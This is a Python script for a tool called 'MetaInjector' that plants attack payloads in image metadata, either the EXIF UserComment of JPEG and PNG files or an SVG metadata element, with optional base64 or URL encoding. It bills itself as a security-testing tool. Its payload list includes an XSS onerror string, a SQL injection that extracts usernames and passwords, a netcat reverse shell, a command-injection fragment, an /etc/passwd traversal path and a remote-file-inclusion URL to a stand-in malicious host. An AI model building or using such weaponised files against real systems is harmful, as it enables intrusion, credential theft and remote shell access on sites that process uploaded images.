import os
from PIL import Image
import piexif
import xml.etree.ElementTree as ET
import base64
import urllib.parse


VULNERABILITIES = {
    "1": ("XSS", "<img src='x' onerror='alert(\"XSS Attack!\")'>"),
    "2": ("SQL Injection", "' UNION SELECT username, password FROM users; --"),
    "3": ("Remote Code Execution", "nc -e /bin/sh 127.0.0.1 4444;"),
    "4": ("Command Injection", "&& /bin/bash -c 'whoami 127.0.0.1;"),
    "5": ("Local File Inclusion (LFI)", "../../../../etc/passwd"),
    "6": ("Remote File Inclusion (RFI)", "http://malicious.com/shell.php"),
    "7": ("Buffer Overflow", "A" * 1000)
}

def print_with_style(text, style="bold"):
    styles = {
        "bold": "\033[1m" + text + "\033[0m",
        "red": "\033[91m" + text + "\033[0m",
        "green": "\033[92m" + text + "\033[0m",
        "yellow": "\033[93m" + text + "\033[0m",
        "blue": "\033[94m" + text + "\033[0m",
        "underline": "\033[4m" + text + "\033[0m"
    }
    print(styles.get(style, text))


def welcome_message():
    print_with_style("********************************************", "blue")
    print_with_style("       Welcome to MetaInjector              ", "bold")
    print_with_style("********************************************", "blue")
    print("A tool for security testing via image metadata injection.")
    print_with_style("By: absholi7ly (X.com @absholi7ly)", "underline")
    print()


def choose_payload():
    print_with_style("Choose the type of payload to inject:", "green")
    for key, value in VULNERABILITIES.items():
        print_with_style(f"{key}. {value[0]}", "yellow")

    choice = input("Enter the number of the payload type (1-7) or 'custom' for a custom payload: ")
    
    if choice in VULNERABILITIES:
        return VULNERABILITIES[choice][1]
    elif choice.lower() == 'custom':
        return input("Enter your custom payload: ")
    else:
        print_with_style("Invalid choice. Defaulting to XSS payload.", "red")
        return VULNERABILITIES["1"][1]


def encode_payload(payload):
    print_with_style("Do you want to encode the payload? (y/n): ", "green")
    encode_choice = input().lower()
    
    if encode_choice == "y":
        print_with_style("Choose encoding method:", "green")
        print_with_style("1. Base64 Encoding", "yellow")
        print_with_style("2. URL Encoding", "yellow")
        encoding_choice = input("Enter the encoding method (1-2): ")

        if encoding_choice == "1":
            return base64.b64encode(payload.encode()).decode('utf-8')
        elif encoding_choice == "2":
            return urllib.parse.quote(payload)
        else:
            print_with_style("Invalid choice. Using raw payload.", "red")
            return payload
    else:
        return payload

def display_metadata(image_path, metadata_type="EXIF"):
    img = Image.open(image_path)
    metadata = None

    if metadata_type == "EXIF":
        if "exif" in img.info:
            exif_data = piexif.load(img.info["exif"])
            metadata = exif_data['Exif'] if exif_data else None
        else:
            print_with_style("No EXIF data found.", "red")
            return
    elif metadata_type == "XMP":
        pass

    if metadata:
        print_with_style(f"Metadata before injection ({metadata_type}):", "blue")
        for tag, value in metadata.items():
            print(f"{tag}: {value}")
    else:
        print_with_style(f"No {metadata_type} metadata available.", "red")

def inject_exif(image_path, payload):
    img = Image.open(image_path)
    
    try:
        exif_dict = piexif.load(img.info["exif"]) if "exif" in img.info else {"Exif": {}}
    except KeyError:
        exif_dict = {"Exif": {}}

    exif_dict['Exif'][piexif.ExifIFD.UserComment] = payload.encode('utf-8')
    
    exif_bytes = piexif.dump(exif_dict)
    
    output_path = f"modified_{os.path.basename(image_path)}"
    img.save(output_path, exif=exif_bytes)
    
    print_with_style(f"Payload injected and saved to {output_path}", "green")
    display_metadata(output_path, "EXIF")

def inject_svg(image_path, payload):
    tree = ET.parse(image_path)
    root = tree.getroot()

    metadata = ET.Element('metadata')
    metadata.text = payload
    root.append(metadata)
    
    output_path = f"modified_{os.path.basename(image_path)}"
    tree.write(output_path)
    
    print_with_style(f"Payload injected and saved to {output_path}", "green")
    print_with_style("Injected Metadata:", "blue")
    print(metadata.text)

def main():
    welcome_message()

    image_path = input("Enter the path to the image file (JPEG, PNG, or SVG): ")
    
    if not os.path.exists(image_path):
        print_with_style("File not found.", "red")
        return
    
    display_metadata(image_path)

    payload = choose_payload()
    encoded_payload = encode_payload(payload)
    
    file_extension = os.path.splitext(image_path)[1].lower()

    if file_extension in ['.jpg', '.jpeg', '.png']:
        inject_exif(image_path, encoded_payload)
    elif file_extension == '.svg':
        inject_svg(image_path, encoded_payload)
    else:
        print_with_style("Unsupported file format. Please provide JPEG, PNG, or SVG.", "red")

if __name__ == "__main__":
    main()
